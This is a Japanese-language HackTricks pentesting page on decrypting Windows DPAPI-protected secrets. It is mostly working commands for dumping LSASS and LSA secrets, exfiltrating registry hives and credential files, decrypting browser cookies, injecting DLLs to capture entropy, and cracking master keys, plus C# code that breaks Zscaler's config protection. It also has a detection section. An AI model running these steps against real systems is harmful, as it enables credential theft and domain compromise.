# DPAPI - パスワードの抽出

{{#include ../../banners/hacktricks-training.md}}



## DPAPIとは

Data Protection API（DPAPI）は、主にWindows operating system内で、**非対称暗号方式のprivate keyを対称暗号化する**ために使用されます。この際、userまたはsystemのsecretを重要なエントロピー源として利用します。この方法により、developersは暗号化キー自体の保護を管理する必要がなくなり、userのlogon secretから導出されたキー、またはsystem encryptionの場合はsystemのdomain authentication secretを使用してデータを暗号化できます。

DPAPIを使用する最も一般的な方法は、**`CryptProtectData`および`CryptUnprotectData`**関数を使用することです。これらにより、applicationsは現在log onしているprocessのsecurity contextを使用してデータを暗号化および復号できます。デフォルトでは、暗号化したデータを復号できるのは、暗号化に使用したものと同じuserまたはsystem contextだけです。<sup>[[2]](#references)[[3]](#references)</sup>

これらの関数は、暗号化および復号時に使用されるオプションの**entropy parameter**も受け取ります。オプションのentropyで保護されたデータを復号するには、同じentropy valueが必要です。<sup>[[2]](#references)[[6]](#references)</sup>

### ユーザーキーの生成

DPAPIは、userのcredentialsからuser-specific value（一般に**pre-key**と呼ばれる）を導出します。正確な導出方法は、accountおよびoperating-system versionによって異なります。たとえばImpacketは、passwordのSHA-1 digestに基づくHMAC-SHA1 path、passwordのMD4/NT hashに基づく別のpath、そしてProtected Users向けのPBKDF2-SHA256-derived pathを試します。このため、offline toolingは、plaintext passwordまたは利用可能なNT hashのいずれかから、必要なmaterialを導出できることが多くあります。<sup>[[2]](#references)[[10]](#references)</sup>

これは特に重要です。攻撃者がuserのpassword hashを取得できた場合、次のことが可能になります。

- そのuserのkeyを使用して**DPAPIで暗号化された任意のデータを、APIへの接続なしに復号**する
- 有効なDPAPI keyの生成を試行して、**passwordをofflineでcrack**する

DPAPIは、保護されたblobごとに新しいmaster keyを作成するのではなく、各userに対して1つ以上の**master key**を保持します。各master keyには**GUID**（Globally Unique Identifier）があり、encrypted blobには、それを保護するmaster keyが記録されています。<sup>[[2]](#references)</sup>

Master keyは **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** directoryに保存されます。ここで`{SID}`はuserのSecurity Identifierです。master-key fileには、userの**pre-key**で保護されたmaterialと、domain userの場合は**domain backup key**で保護されたrecovery materialが含まれます。<sup>[[2]](#references)</sup>

なお、master keyの暗号化に使用される**domain keyはdomain controllers内にあり、変更されることはありません**。そのため、攻撃者がdomain controllerにアクセスできる場合、domain backup keyを取得して、そのdomain内のすべてのuserのmaster keyを復号できます。<sup>[[2]](#references)</sup>

Encrypted blobのheaderには、データの暗号化に使用された**master keyのGUID**が含まれています。

> [!TIP]
> DPAPI encrypted blobは **`01 00 00 00`** で始まります

Master keyを検索します：
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
これは、あるユーザーの Master Keys がまとまっている場合の例です:

![DPAPI とは - Users key generation: これは、あるユーザーの Master Keys がまとまっている場合の例です](<../../images/image (1121).png>)

### Machine/System key generation

これは、machine がデータを暗号化するために使用する key です。**DPAPI_SYSTEM LSA secret** に基づいており、SYSTEM user のみがアクセスできる特殊な key です。この key は、machine-level credentials や system-wide secrets など、system 自体からアクセスする必要があるデータの暗号化に使用されます。<sup>[[2]](#references)</sup>

これらの key には **domain backup が存在しない**ため、ローカルでのみアクセス可能です:

- **Mimikatz** は、次の command で LSA secrets を dump してアクセスできます: `mimikatz lsadump::secrets`
- secret は registry 内に保存されるため、administrator は **アクセスできるように DACL permissions を変更できます**。registry path は次のとおりです: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- registry hives からの offline extraction も可能です。たとえば、target 上で administrator として hives を保存し、exfiltrate します:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
次に、analysis box でハイブから DPAPI_SYSTEM LSA secret を復元し、それを使用して machine-scope blobs（scheduled task passwords、service credentials、Wi‑Fi profiles など）を復号します：
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
Veeam-specific DPAPI example:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### DPAPIによって保護されるデータ

DPAPIによって保護される個人データには、次のものがあります。

- Windows creds
- Internet ExplorerおよびGoogle Chromeのパスワードと自動入力データ
- OutlookやWindows MailなどのアプリケーションのE-mailおよび内部FTPアカウントのパスワード
- 共有フォルダー、リソース、wireless networks、Windows Vaultのパスワード（暗号化キーを含む）
- remote desktop接続、.NET Passport、各種の暗号化およびauthentication用途のprivate keysのパスワード
- Credential Managerで管理されるnetwork passwords、およびCryptProtectDataを使用するアプリケーション（Skype、MSN messengerなど）の個人データ
- registry内部のencrypted blobs
- ...

Systemによって保護されるデータには、次のものがあります。
- Wifi passwords
- Scheduled task passwords
- ...

### Master keyの抽出オプション

- userがdomain admin privilegesを持っている場合、**domain backup key**にアクセスして、domain内のすべてのuser master keysをdecryptできます：
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- ローカル管理者権限があれば、**LSASS memory にアクセス**して、接続されているすべてのユーザーの DPAPI master keys と SYSTEM key を抽出できます。
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- ユーザーがローカル管理者権限を持っている場合、**DPAPI_SYSTEM LSA secret** にアクセスしてマシンの master keys を復号できます。
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- ユーザーのパスワードまたはNTLM hashが既知の場合、**ユーザーのmaster keysを直接復号**できます:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- ユーザーとしてセッション内にいる場合、**RPCを使用してmaster keysを復号するためのbackup key**をDCに要求できます。local adminであり、かつユーザーがログインしている場合は、これを利用するために**そのユーザーのセッショントークンを盗む**ことができます。
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Vault の一覧表示
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPIで暗号化されたデータへのアクセス

### DPAPIで暗号化されたデータを探す

ユーザーの**保護されたファイル**は通常、以下にあります。

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 上記のパスで `\Roaming\` を `\Local\` に変更したパスも確認してください。

列挙の例：
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) は、ファイルシステム、レジストリ、B64 blobs 内の DPAPI encrypted blobs を検出できます:<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
なお、同じ repo の [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) を使用すると、cookies などの DPAPI で保護された sensitive data を decrypt できます。<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron quick recipes（SharpChrome）

- Current user の saved logins/cookies を interactive に decrypt（user context で実行すると、Credential Manager から extra key が解決されるため、Chrome 127+ の app-bound cookies でも動作します）：
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- ファイルしかない場合の Offline analysis。まず profile の "Local State" から AES state key を抽出し、それを使って cookie DB を復号します：
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- DPAPI domain backup key（PVK）と target host の admin 権限がある場合の、ドメイン全体/remote triage：
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- ユーザーの DPAPI prekey/credkey（LSASS から）を持っている場合、password cracking を省略して、プロファイルデータを直接 decrypt できます。
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
メモ
- 新しい Chrome/Edge の build では、特定の cookies が "App-Bound" encryption を使用して保存される場合があります。追加の app-bound key がなければ、これらの cookies を offline decryption することはできません。自動的に取得するには、target user context で SharpChrome を実行してください。詳細については、以下で参照している Chrome security blog post を確認してください。<sup>[[5]](#references)</sup>

### Access keys and data

- **Use SharpDPAPI** で、current session の DPAPI encrypted files から credentials を取得します。
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **認証情報を取得**: 暗号化されたデータや guidMasterKey など。<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

**domain backup key** を要求するユーザーの masterkey を RPC 経由で復号します：
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI** tool は、masterkey decryption 用に以下の arguments もサポートしています（`/rpc` を使用して domain backup key を取得したり、`/password` で plaintext password を使用したり、`/pvk` で DPAPI domain private key file を指定したりできる点に注目してください...）。<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **masterkeyを使用してデータを復号する**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
**SharpDPAPI** ツールは、`credentials|vaults|rdg|keepass|triage|blob|ps` の復号化に関して、以下の引数にも対応しています（`/rpc` を使用してドメインのバックアップキーを取得したり、`/password` を使用して平文パスワードを利用したり、`/pvk` で DPAPI ドメイン秘密鍵ファイルを指定したり、`/unprotect` で現在のユーザーセッションを使用したりできる点に注目してください...）：<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- DPAPI prekey/credkeyを直接使用する（password不要）

LSASSをdumpできる場合、Mimikatzは多くの場合、plaintext passwordを知らなくてもユーザーのmasterkeysを復号するために使用できる、logonごとのDPAPI keyを公開します。この値をtoolingに直接渡します：
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- **現在のユーザーセッション**を使用してデータを復号する:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Impacket dpapi.pyによるオフライン復号

被害者ユーザーのSIDとパスワード（またはNT hash）があれば、Impacketのdpapi.pyを使用して、DPAPI masterkeysとCredential Manager blobsを完全にオフラインで復号できます。<sup>[[10]](#references)[[11]](#references)</sup>

- ディスク上のartefactsを特定します。
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- 対応するmasterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- ファイル転送toolingが不安定な場合は、ホスト上でファイルをbase64に変換し、出力をコピーします。
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- ユーザーの SID と password/hash を使用して masterkey を復号する:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- 復号済みの masterkey を使用して credential blob を復号する：
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
この workflow では、Windows Credential Manager を使用するアプリによって保存された domain credentials（管理者アカウント（例: `*_adm`）を含む）を回収できることがよくあります。

---

### Optional Entropy（「Third-party entropy」）の処理

一部のアプリケーションは、`CryptProtectData` に追加の **entropy** 値を渡します。この値がなければ、正しい masterkey が既知であっても blob を復号できません。したがって、この方法で保護された credentials（Microsoft Outlook や一部の VPN clients など）を対象とする場合、entropy の取得が不可欠です。

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture)（2022）は、target process 内部の DPAPI functions に hook を仕掛け、渡された optional entropy を透過的に記録する user-mode DLL です。`outlook.exe` や `vpnclient.exe` などの process に対して **DLL-injection** mode で EntropyCapture を実行すると、各 entropy buffer を呼び出し元の process および blob に対応付けた file が出力されます。取得した entropy は、後から **SharpDPAPI**（`/entropy:`）または **Mimikatz**（`/entropy:<file>`）に渡して data を復号できます。<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### masterkey の offline cracking（Hashcat & DPAPISnoop）

Microsoft は Windows 10 v1607（2016）以降、**context 3** masterkey format を導入しました。`hashcat` v6.2.6（2023 年 12 月）では、hash-modes **22100**（DPAPI masterkey v1 context）、**22101**（context 1）、**22102**（context 3）が追加され、masterkey file から user password を直接 GPU-accelerated cracking できるようになりました。そのため、攻撃者は target system とやり取りせずに、word-list または brute-force attacks を実行できます。<sup>[[7]](#references)</sup>

`DPAPISnoop`（2024）はこの process を自動化します：
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
この tool は Credential および Vault blobs も解析し、cracked keys で復号して cleartext passwords をエクスポートできます。<sup>[[8]](#references)</sup>


### 他のマシンのデータにアクセス

**SharpDPAPI と SharpChrome** では、**`/server:HOST`** オプションを指定してリモートマシンのデータにアクセスできます。もちろん、そのマシンにアクセスできる必要があり、次の例では **domain backup encryption key が既知である**ことを前提としています：
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## その他のツール

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) は、LDAP directory からすべてのユーザーとコンピューターを抽出し、RPC 経由で domain controller の backup key を抽出する処理を自動化するツールです。その後、スクリプトはすべてのコンピューターの IP address を解決し、各コンピューターに対して smbclient を実行して、すべてのユーザーの DPAPI blobs を取得し、domain backup key を使ってすべてを復号します。

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP から抽出したコンピューターリストを使えば、把握していなかった場合でも、すべてのサブネットワークを見つけられます！

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) は、DPAPI で保護された secrets を自動的に dump できます。2.x release では、以下が導入されました。<sup>[[9]](#references)</sup>

* 数百台の host から blobs を並列収集
* **context 3** masterkeys の parsing と Hashcat cracking の自動 integration
* Chrome の「App-Bound」暗号化 cookies の support（次のセクションを参照）
* endpoint を繰り返し poll し、新しく作成された blobs を diff する新しい **`--snapshot`** mode

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) は、masterkey/credential/vault files 用の C# parser であり、Hashcat/JtR formats を出力でき、必要に応じて cracking を自動的に実行できます。Windows 11 24H1 までの machine および user masterkey formats を完全にサポートしています。<sup>[[8]](#references)</sup>


## 一般的な検知

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`、`C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` およびその他の DPAPI 関連 directories への access。
- 特に **C$** や **ADMIN$** などの network share 経由の access。
- **Mimikatz**、**SharpDPAPI**、または同様の tooling を使用して LSASS memory に access したり、masterkeys を dump したりすること。
- Event **4662**: *オブジェクトに対して操作が実行されました* – **`BCKUPKEY`** object への access と相関付けることができます。
- process が *SeTrustedCredManAccessPrivilege* (Credential Manager) を要求したときの Event **4673/4674**

---
### 2023-2025 の vulnerabilities と ecosystem の変更

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023)。network access を持つ attacker は、domain member をだまして malicious な DPAPI backup key を取得させ、user masterkeys を復号できました。November 2023 の cumulative update で patch 済みです – administrators は DC と workstations が完全に patch されていることを確認する必要があります。<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound” cookie encryption** (July 2024) は、legacy の DPAPI-only protection を、user の **Credential Manager** に保存される追加の key に置き換えました。cookies の offline decryption には、DPAPI masterkey と **GCM-wrapped app-bound key** の両方が必要になりました。SharpChrome v2.3 と DonPAPI 2.x は、user context で実行した場合に追加の key を recover できます。<sup>[[5]](#references)</sup>


### Case Study: Zscaler Client Connector – SID から導出される Custom Entropy

Zscaler Client Connector は、`C:\ProgramData\Zscaler` 配下に複数の configuration files（例: `config.dat`、`users.dat`、`*.ztc`、`*.mtt`、`*.mtc`、`*.mtp`）を保存します。各 file は **DPAPI (Machine scope)** で暗号化されていますが、vendor は disk 上に保存する代わりに、*runtime で計算される* **custom entropy** を提供します。<sup>[[1]](#references)</sup>

entropy は、次の 2 つの要素から再構築されます。

1. `ZSACredentialProvider.dll` 内に埋め込まれた hard-coded secret。
2. configuration が属する Windows account の **SID**。

DLL に実装された algorithm は、次と同等です。
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
秘密情報はディスクから読み取れる DLL に埋め込まれているため、**SYSTEM 権限を持つローカル攻撃者は、任意の SID 用の entropy を再生成し、blob をオフラインで復号できます**：
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Decryption により、すべての **device posture check** とその期待値を含む完全な JSON 設定が得られます。この情報は、client-side bypasses を試みる際に非常に価値があります。

> TIP: その他の暗号化された artefacts（`*.mtt`、`*.mtp`、`*.mtc`、`*.ztc`）は、entropy なし（`16` 個のゼロバイト）で DPAPI により保護されています。そのため、SYSTEM privileges を取得すれば、`ProtectedData.Unprotect` で直接復号できます。

## References

- [1] [Synacktiv – zero trust を信頼すべきか？Zscaler posture checks の bypass](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets。DPAPI における security analysis と data recovery](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Mimikatz と C++ による DPAPI Encrypted Secrets の読み取り](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI（Data Protection Application Programming Interface）Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Windows における Chrome cookies の security 改善](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: DPAPI Optional Entropy の Simple Extraction](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 release notes](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub repository](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI project page](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL abuse、KeePassXC Argon2 cracking、DPAPI decryption による DC admin への昇格](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
